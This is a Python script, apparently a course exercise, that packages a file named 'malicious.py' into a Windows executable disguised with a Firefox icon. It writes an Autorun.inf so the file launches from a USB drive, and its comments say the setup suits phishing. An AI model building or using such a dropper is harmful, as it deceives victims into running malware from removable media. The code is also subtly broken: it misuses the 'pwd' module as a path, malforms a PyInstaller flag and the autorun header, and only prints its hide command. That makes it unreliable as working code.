import imp
import pwd
# We will use Pyinstaller to creare a windows executable from a Python script
# This is helpful because, well python script might not be runnable and 
# a target system, if they don't have Python installed, So you have self-contained executable,
# it's going to run on windows.
# more useful for phishing attacks

# THe shutil module offers a number of high-level operations 
# on files and collections of files.
# This module helps in automating process of copying and removal of files and directionary


import PyInstaller.__main__
import shutil
import os

filename = "loka.py"
exename = "Benim.exe"
icon = "Firefox.ico"   # Pyinstaller can display icon for an executable
usbdir = os.path.join(pwd,"USB")  # USB is a folder name

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE")

# create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--log-level-ERROR",
    "--name="+exename,
    "--icon="+icon
])

print("EXE Created")

# Clean up after PyInstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")   # remove a temporary file, or a configuration file(Benem.exe.spec) which talhs about the specifications

print("Creating Autorun file")

# Create Autorun File using Python I/O or File I/O and put it
# in this USB drive to cause it ot run automatically
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

print("Setting up USB")

# Move files to USB and set to hidden
# Moving both the Benim.exe and Autorun.inf to the USB
# then we're using windows system commands to change attributes of that particular file to hidden

shutil.move(exename,usbdir)
shutil.move("Autorun.inf", usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))



